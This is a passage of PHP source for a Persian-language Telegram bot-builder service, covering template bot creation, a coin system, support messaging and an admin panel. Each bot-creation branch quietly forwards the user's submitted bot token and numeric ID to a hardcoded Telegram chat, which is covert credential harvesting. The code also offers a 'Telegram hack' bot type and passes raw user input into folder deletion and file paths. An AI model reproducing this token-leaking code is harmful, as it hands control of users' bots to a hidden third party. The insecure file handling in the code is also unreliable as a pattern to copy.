file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$channel = file_get_contents("data/$chat_id/anti.txt");
$class = file_get_contents("source/parvazAntispam/anti21.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
$class = str_replace("[*[USERNAME]*]",$un,$class);
$class = str_replace("[*[CHANNEL]*]",$channel,$class);
file_put_contents("bot00/$un/anti21.php",$class);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/anti21.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//======
elseif($text1 == "📇یوزر اینفو📇"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","user");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 10 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}

elseif ($state == "user" && $text != "↩️برگشت") {
    if(strpos($text, "%") !== false || strpos($text, '$' !== false)) {
        file_put_contents("data/$chat_id/stats.txt", "No");
    } else {
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "🤖",
        ]);
    }
}

$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$randbotsa/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$randbotsa/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$randbotsa");
mkdir("bot00/$randbotsa/data");
file_put_contents("bot00/$randbotsa/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$class = file_get_contents("source/userinfo/mqw.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
file_put_contents("bot00/$randbotsa/mqw.php",$class);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$randbotsa."/mqw.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($randbotsa,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $randbotsa."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($randbotsa,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $randbotsa."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//===============//
elseif($text1 == "📱هک تلگرام📱️"){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","pm");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
🔹توکن ربات خود را از @botfather بفرستید.  
اگر درباره توکن چیزی نمیدانید از قسمت راهنمای رباتساز استفاده کنید😉
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌امتیاز شما برای ساخت این ربات کافی نمی باشد❌

💰جهت ساخت این ربات شما به 15 امتیاز نیاز دارید💰

💰امتیاز فعلی شما💰
$coin
",
'parse_mode'=>'HTML',
]);
}
}if(strpos($text, '"')!== false && strpos($text, '$') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :/
",
]);
}
elseif($state == "pm" && $text !="↩️برگشت" ){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌توکن ربات نامعتبر است لطفا یک توکن معتبر ارسال کنید❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖درحال ساخت ربات🤖",
]);
if($type =="Gold"){
file_put_contents("bot00/$un/data/bottype.txt","gold");
}else{
file_put_contents("bot00/$un/data/bottype.txt","free");
}
 //=================================
mkdir("bot00/$un");
mkdir("bot00/$un/data");
file_put_contents("bot00/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$class = file_get_contents("source/delkhah/index.php");
$class = str_replace("[*[TOKEN]*]",$text,$class);
$class = str_replace("[*[ADMIN]*]",$from_id,$class);
file_put_contents("bot00/$un/index.php",$class);
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/bot00/".$un."/index.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
$user_b = file_get_contents("data/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("data/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("data/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
✅ربات شما با موفقیت ساخته شد✅
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);

bot('sendMessage',[
'chat_id'=>-1001446893389,
'text'=>"
💀ربات جدید ساخته شد
توکن
$text
ایدی عددی سازنده
$from_id

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"🤖ورود به ربات🤖",'url'=>"https://t.me/$un"]],
]
])
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 0;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//=========================
elseif($text1 == "🚫حذف ربات"){
if($created == "yes"){
file_put_contents("data/$from_id/state.txt","deleterob");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❌آیدی رباتی را که میخواهید حذف شود را بدون @ و با رعایت حروف کوچک و بزرگ ارسال کنید❌
",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌شما هنوز رباتی نساخته اید❌️",
'parse_mode'=>'Markdown', 
]);
}
}
elseif($state =="deleterob" && $text !="↩️برگشت"){
if($chat_id != $my_id  && $chat_id != $Dev){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"❌شما سازنده این ربات نیستید❌️",
]);
}else{
deletefolder("bot00/$text");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅ربات شما با موفقیت حذف شد✅",
]);
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin +5;
file_put_contents("data/$from_id/coin.txt",$newcoin);
}
}
//=============تعداد امتیاز ویژه شدن==========//
elseif($text1 == "💎ویژه شدن💎" && $type == "Free"){
if($coin >= 20){
$coin = file_get_contents("data/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 20;
file_put_contents("data/$from_id/coin.txt",$newcoin);
file_put_contents("data/$from_id/type.txt","Vip");
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage', [
'chat_id' => $chat_id,
'text' =>"
🎉تبریک به مقدار 20 امتیاز از حساب شما کسر شد و با موفقیت ویژه شدید🎉
",
]);
}else{
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id' => $chat_id,
'text' =>"
❌متاسفانه مقدار امتیاز شما کافی نمی باشد ابتدا تعداد امتیازتان را به 20 برسانید و مجددا تلاش کنید❌
",
]);
}
}
elseif($text1 == "💎ویژه شدن💎" && $type == "Vip" ){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌حساب شما از قبل ویژه است❌
",
'parse_mode'=>"HTML",  
]);
}
//===============پشتیبانی========//
elseif($text1 == "📮پشتیبانی"){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
لطفا بخش مورد نظر خود را انتخاب کنید
",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"بخش فنی🔹"],['text'=>"️🔹 بخش سوالات متعدد"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 =="️🔹 بخش سوالات متعدد" or $text1 == "بخش فنی🔹"){
file_put_contents("data/$from_id/state.txt","mok");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
📮 لطفا پیام خود را به صورت متن یا عکس و با رعایت ادب ارسال کنید تا تیم پشتیبانی در اسرع وقت به پیام شما پاسخ دهند :",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩️برگشت"]],
]
])
]);
}
elseif($state == "mok" and $text !="↩️برگشت" and $text != "📨ارسال جواب📨"){
bot('ForwardMessage',[
'chat_id'=>$Dev,
'from_chat_id'=>$from_id,
'message_id'=>$message_id
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✅پیام شما با موفقیت ارسال شد✅",
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"👇یک نفر با آیدی زیر یک پیام ارسال کرد👇

<pre>$from_id</pre>
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'📨ارسال جواب📨']],
],
'resize_keyboard'=>true,
])
]);
}
elseif($da != "" && $from_id == $Dev){
bot('sendMessage',[
'chat_id'=>$da,
 'text'=>"
 👇یک پیام از طرف پشتیبانی دارید👇

$text
",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"✅پیام شما با موفقیت ارسال شد✅",
'parse_mode'=>'MarkDown',
]);
}
//===========
elseif($text1 == "/panel" or $text == "🔚" or $text == "👤پنل مدیریت👤"){
if($from_id == $Dev){
bot('sendmessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"آنبلاک کردن ✅"],['text'=>"بلاک کردن❌"]],
[['text'=>"امتیاز به کاربر ⭐️"],['text'=>"🎁 الماس همگانی"],['text'=>"پیام به کاربر📭"]],
[['text'=>"اطلاعات کاربر 👤"],['text'=>"حذف امتیاز کاربر 😤"]],
[['text'=>"فوروارد همگانی✒"],['text'=>"پیام همگانی✏"]],
[['text'=>"روشن کردن ربات🔔"],['text'=>"خاموش کردن ربات🔕"]],
[['text'=>""],['text'=>"وارد کردن کد 🌀"]],
[['text'=>"🔅 ساخت رباتساز برای فروش 🔅"]],
[['text'=>"📊"],['text'=>"ربات ها 📮"],['text'=>"حذف ربات 🗑"]],
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true
])
]);
}else{
SendMessage($chat_id,"😕شما سازندم نیستی😕","HTML");
}
}
elseif($text1 == "فوروارد همگانی✒" && $from_id == $Dev){
file_put_contents("data/$from_id/step.txt","fwr12");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا پیام خود را فروارد کنید💢",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"🔚"]
],
]
])
]);
}
elseif($step == "fwr12" && $from_id == $Dev){
file_put_contents("data/$from_id/step.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما با موفقیت به تمام اعضا فروارد شد❗️",
]);
$all_member = fopen( "users.txt", "r");
while( !feof( $all_member)){
$user = fgets( $all_member);
bot('ForwardMessage',[
'chat_id'=>$user,
'from_chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
}
elseif($text1 == "ربات ها 📮" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","none");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
 کل ربات های ساخته شده:
$Bots
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($text1 == "حذف ربات 🗑" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","delezi");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
📀 ایدی ربات مورد نظر رو بدون @ ارسال کنید....
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step =="delezi" && $text !="🔚" ){
file_put_contents("data/$from_id/step.txt","none");
deletefolder("bot00/$text");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ربات حذف شد ✅",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پیام به کاربر📭"]],
[['text'=>"🔚"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "آنبلاک کردن ✅" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","sharr");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا ایدی عددی کاربر مورد نظر رو ارسال کنید",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "sharr" && $text !="🔚" ){
$newlist = str_replace($text, "", $blocklist);
file_put_contents("data/blocklist.txt", $newlist);
file_put_contents("data/$chat_id/step.txt", "No");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
خب ایدی $text از بلاکی درآمد 😎
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($text1 == "بلاک کردن❌" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","shar");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا ایدی فرد مورد نظر را ارسال کنید",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "shar" && $text !="🔚" ){
file_put_contents("data/$from_id/shar.txt","$text");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
ایدی $text از ربات بلاک شد
",
]);
$adduser = file_get_contents("data/blocklist.txt");
$adduser .= $text . "\n";
file_put_contents("data/blocklist.txt", $adduser);
file_put_contents("data/$from_id/step.txt","no");
$id11 = file_get_contents("data/$from_id/shar.txt");
bot('Sendmessage',[
'chat_id'=>$id11,
'text'=>"ارتباط شما با سرور ما قطع شد و نمیتوانید از بات استفاده کنید 😹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($text1 == "📨ارسال جواب📨" && $chat_id == $Dev){
file_put_contents("data/$from_id/state.txt","info");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🔢آیدی عددی فرد را وارد کنید🔢",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($state == "info" && $text !="↩️برگشت" ){
file_put_contents("data/$from_id/state.txt","sendpm");
file_put_contents("data/$from_id/info.txt","$text");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📨لطفا پیام خود را وارد کنید📨",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩️برگشت"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($state== "sendpm"){
file_put_contents("data/$from_id/state.txt","none");
file_put_contents("data/$from_id/sendpm.txt","$text");
$sendpm = file_get_contents("data/$from_id/sendpm.txt");
$info = file_get_contents("data/$from_id/info.txt");
bot('Sendmessage',[
'chat_id'=>$info,
'text'=>"
 👇یک پیام از طرف پشتیبانی دارید👇
 
$sendpm
",
'parse_mode'=>'HTML',
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"✅پیام شما با موفقیت ارسال شد✅",
'parse_mode'=>'HTML',
]);
}
//========
//سورس رباتساز پلاس کریت اوپن شده در اوپو تیم @ShahreSource
elseif($text == 'وارد کردن کد 🌀' && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","code free");
file_put_contents("data/$from_id/kodomadmin.txt", "$first_name");
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"☢ کد مورد نظر رو وارد کنید",
     'parse_mode'=>'html'
 ]);
}
elseif($bot == "code free"){
file_put_contents("data/$from_id/step.txt","number coins");
file_put_contents("admin/code/$text.txt","false");
file_put_contents("data/$from_id/amir.txt",$text);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"حالا تعداد الماس ها را تعیین کنید.",
     'parse_mode'=>'html'
 ]);
}
elseif($bot == "number coins"){
file_put_contents("admin/coins/$amir.txt",$text);
file_put_contents("data/$from_id/step.txt","none");
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"☢ کد ثبت شد.",
     'parse_mode'=>'html'
 ]);
 
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"😀تا ثانیه های دیگر کد هدیه گذاشته خواهد شد😀
     
🎁آماده باشید🎁",
     'parse_mode'=>'html'
 ]);
 sleep(15);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"1️⃣",
     'parse_mode'=>'html'
 ]);
 sleep(10);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"2️⃣",
     'parse_mode'=>'html'
 ]);
 sleep(5);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"3️⃣",
     'parse_mode'=>'html'
 ]);
  sleep(1);
 bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"
🎁کد هدیه جدید ساخته شد🎁

🎁کد هدیه🎁 <pre>$amir</pre>

💰تعداد امتیاز💰 $text

👇سریع تر کد بالا را در رباتساز وارد کنید تا امتیاز مورد نظر را بگیرید👇

🆑 @$channel
🤖 @$bot_id

",
     'parse_mode'=>'html',
     'reply_markup'=>json_encode([
         'inline_keyboard'=>[
             [
                 ['text'=>"🤖رباتساز $name_bot🤖",'url'=>"https://telegram.me/$bot_id"]
             ]]
     ])
 ]);

}  
//=====نمایندگی===========//
elseif($text1 == "🔅 ساخت رباتساز برای فروش 🔅" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"سلام مدیر 😃

به بخش ساخت نمایندگی رباتساز $name_bot خوش اومدی 😄😋

برای ساخت ربات از دکمه زیر استفاده کن 🙂🥀",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"ساخت ✅"]],
[['text'=>"👤 تنظیم آیدی عددی"]],
[['text'=>"🔚"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($text1 == "👤 تنظیم آیدی عددی" && $from_id == $Dev){
save("data/$from_id/com.txt","adminclicker");
bot('sendMessage', [
'chat_id'=>$from_id,
'text'=>"ایدی عددی مدیر را وارد نمایید🌱",
'message_id'=>$messageid,
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
  'resize_keyboard'=>true,
  'keyboard'=>[
[['text'=>"🔚"]],
   ]
  ])
]);
}
elseif($command == 'adminclicker' && $from_id == $Dev){
save("data/$chat_id/adminclicker.txt","$text");
save("data/$from_id/com.txt","none");
bot('sendmessage', [
'chat_id' => $chat_id,
'text'=>"تنظیم شد!",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}


elseif($text1 == "ساخت ✅" && $chat_id == $Dev){
if($coin >= 0){
file_put_contents("data/$from_id/state.txt","BotSaz");
bot('sendMessage',[
'chat_id'=>$chat_id,
 'text'=>"
مدیر لطفا آیدی کانال خریدار رو وارد کن 😁 :
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🧩 امتیاز شما برای ساخت رباتساز کافی نمیباشد. 
👩🏻‍💼 برای ساخت رباتساز نیاز به 20 امتیاز داری.
🎯 از بخش حساب کاربری اقدام به افزایش امتیاز خود کنید.
🎫 امتیاز شما : $coin
",
'parse_mode'=>'HTML',
]);
}
}
if(preg_match('/^\/([Cc][Rr][Ee][Aa][Tt][Oo][Rr])/',$text) or $text == "سازنده"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
😐
",
'parse_mode'=>"HTML",
]);
}
elseif($state == "BotSaz" && $text !="❕ᗷᗩᑕᏦ❗️" ){
if($text[0] == '@')$text = substr($text, 1);
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
اشتباهه
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}elseif(!preg_match('/^([a-zA-Z][a-zA-Z0-9_]{4,31}|)$/', $text)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>'ایدی اشتباهه ❌',
]);
}else{
file_put_contents("data/$chat_id/BotSaz.txt",$text);
file_put_contents("data/$from_id/state.txt","BotSaz1");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"خب حالا توکن ربات خریدار را وارد کن 😋 :",
'parse_mode'=>'Markdown', 
]);
}
}elseif($state == "BotSaz1"){
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن نامعتبر است، لطفا یک توکن معتبر ارسال کنید ❌
",
]);
}else{
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🌀 درحال اتصال به سرور . . .",
]);
if($type =="Gold"){
file_put_contents("BotSaz/$un/data/bottype.txt","gold");
}else{
file_put_contents("BotSaz/$un/data/bottype.txt","free");
}
 //=================================
mkdir("BotSaz/$un");
mkdir("BotSaz/$un/data");
mkdir("BotSaz/$un/bot00");
mkdir("BotSaz/$un/source");
mkdir("BotSaz/$un/source/telhack");
mkdir("BotSaz/$un/source/userinfo");
mkdir("BotSaz/$un/source/number");
mkdir("BotSaz/$un/source/number/data");
mkdir("BotSaz/$un/source/member");
mkdir("BotSaz/$un/source/member/other");
mkdir("BotSaz/$un/source/Kartoni");
mkdir("BotSaz/$un/source/Kartoni/photo");
mkdir("BotSaz/$un/source/chat");
mkdir("BotSaz/$un/source/voice");
mkdir("BotSaz/$un/source/voice/data");
mkdir("BotSaz/$un/source/makan");
mkdir("BotSaz/$un/source/delkhah");
mkdir("BotSaz/$un/source/roman");
mkdir("BotSaz/$un/source/parvazAntispam");
mkdir("BotSaz/$un/source/HostVid");
mkdir("BotSaz/$un/source/fal");
//
$test1 = file_get_contents("source/telhack/telo22.php");
$test2 = file_get_contents("source/telhack/jdf.php");
$test3 = file_get_contents("source/userinfo/mqw.php");
$test4 = file_get_contents("source/number/index.php");
$test5 = file_get_contents("source/member/mamo.php");
$test6 = file_get_contents("source/Kartoni/kar12.php");
$test7 = file_get_contents("source/chat/chq.php");
$test8 = file_get_contents("source/chat/time.php");
$test9 = file_get_contents("source/voice/index.php");
$test10 = file_get_contents("source/voice/doctor-thing1-audio-01.jpg");
$test11 = file_get_contents("source/voice/data/user.json");
$test12 = file_get_contents("source/makan/make.php");
$test13 = file_get_contents("source/delkhah/index.php");
$test14 = file_get_contents("source/roman/uuff.php");
$test15 = file_get_contents("source/parvazAntispam/anti21.php");
$test16 = file_get_contents("source/HostVid/hasto.php");
$test17 = file_get_contents("source/HostVid/jdf.php");
$test18 = file_get_contents("source/fal/op.php");

//==============

save("BotSaz/$un/source/telhack/index.php",$test1);
save("BotSaz/$un/source/telhack/jdf.php",$test2);
save("BotSaz/$un/source/userinfo/index.php",$test3);
save("BotSaz/$un/source/number/index.php",$test4);
save("BotSaz/$un/source/member/mamo.php",$test5);
save("BotSaz/$un/source/Kartoni/kar12.php",$test6);
save("BotSaz/$un/source/chat/chq.php",$test7);
save("BotSaz/$un/source/chat/time.php",$test8);
save("BotSaz/$un/source/voice/index.php",$test9);
save("BotSaz/$un/source/voice/doctor-thing1-audio-01.jpg",$test10);
save("BotSaz/$un/source/voice/data/user.json",$test11);
save("BotSaz/$un/source/makan/make.php",$test12);
save("BotSaz/$un/source/delkhah/index.php",$test13);
save("BotSaz/$un/source/roman/uuff.php",$test14);
save("BotSaz/$un/source/parvazAntispam/anti21.php",$test15);
save("BotSaz/$un/source/HostVid/hasto.php",$test16);
save("BotSaz/$un/source/HostVid/jdf.php",$test17);
save("BotSaz/$un/source/fal/op.php",$test18);
//
file_put_contents("BotSaz/$un/data/my_id.txt","$from_id");
file_put_contents("data/$from_id/state.txt","none");
$channel = file_get_contents("data/$chat_id/BotSaz.txt");
$GRT = file_get_contents("source/BotSaz/index.php");
$GRTT = file_get_contents("source/BotSaz/index.html");
$GRT = str_replace("[*[TKN]*]",$text,$GRT);
$GRT = str_replace("[*[ADMIN]*]",$adminbotsaz,$GRT);
$GRT = str_replace("[*[US]*]",$un,$GRT);
$GRT = str_replace("[*[CHANEL]*]",$channel,$GRT);
file_put_contents("BotSaz/$un/index.php",$GRT);
file_put_contents("BotSaz/$un/index.html",$GRTT);
//==================================
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/BotSaz/".$un."/index.php");
file_put_contents("data/$from_id/create.txt","yes");
$users = file_get_contents('data/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('data/bots.txt');
$add_bot .= $un."\n";
file_put_contents('data/bots.txt',$add_bot);
}
